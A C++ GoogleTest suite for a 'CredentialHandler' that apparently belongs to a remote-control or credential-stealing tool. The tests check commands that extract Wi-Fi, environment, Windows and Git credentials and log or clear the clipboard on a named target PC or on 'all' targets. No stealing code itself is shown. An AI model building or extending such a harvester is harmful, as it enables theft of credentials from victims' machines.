#include <gtest/gtest.h>

#include "application/commands/CredentialHandler.hpp"
#include "../mocks/MockReporter.hpp"

using namespace nuub::application::commands;
using namespace nuub::tests::mocks;

class CredentialHandlerTest : public ::testing::Test {
protected:
    MockReporter reporter;

    CredentialHandler create_handler() {
        return CredentialHandler(reporter, "PC-Test");
    }
};

TEST_F(CredentialHandlerTest, CredsExtractsAll) {
    auto handler = create_handler();
    auto result = handler.handle_creds("PC-Test");
    EXPECT_TRUE(result.is_success());
    EXPECT_FALSE(reporter.messages.empty());
}

TEST_F(CredentialHandlerTest, WifiCredsExtracts) {
    auto handler = create_handler();
    auto result = handler.handle_wifi_creds("PC-Test");
    EXPECT_TRUE(result.is_success());
    EXPECT_FALSE(reporter.messages.empty());
}

TEST_F(CredentialHandlerTest, EnvCredsExtracts) {
    auto handler = create_handler();
    auto result = handler.handle_env_creds("PC-Test");
    EXPECT_TRUE(result.is_success());
    EXPECT_FALSE(reporter.messages.empty());
}

TEST_F(CredentialHandlerTest, WinCredsExtracts) {
    auto handler = create_handler();
    auto result = handler.handle_win_creds("PC-Test");
    EXPECT_TRUE(result.is_success());
    EXPECT_FALSE(reporter.messages.empty());
}

TEST_F(CredentialHandlerTest, GitCredsExtracts) {
    auto handler = create_handler();
    auto result = handler.handle_git_creds("PC-Test");
    EXPECT_TRUE(result.is_success());
    EXPECT_FALSE(reporter.messages.empty());
}

TEST_F(CredentialHandlerTest, CliplogNoMonitorShowsMessage) {
    auto handler = create_handler();
    auto result = handler.handle_cliplog("PC-Test");
    EXPECT_TRUE(result.is_success());
    EXPECT_TRUE(reporter.messages[0].first.find("no disponible") != std::string::npos);
}

TEST_F(CredentialHandlerTest, ClipclearWorks) {
    auto handler = create_handler();
    auto result = handler.handle_clipclear("PC-Test");
    EXPECT_TRUE(result.is_success());
    EXPECT_TRUE(reporter.messages[0].first.find("limpiado") != std::string::npos);
}

TEST_F(CredentialHandlerTest, WrongTargetIgnored) {
    auto handler = create_handler();
    handler.handle_creds("Other-PC");
    EXPECT_TRUE(reporter.messages.empty());
}

TEST_F(CredentialHandlerTest, AllTargetsMatch) {
    auto handler = create_handler();
    auto result = handler.handle_creds("all");
    EXPECT_TRUE(result.is_success());
    EXPECT_FALSE(reporter.messages.empty());
}
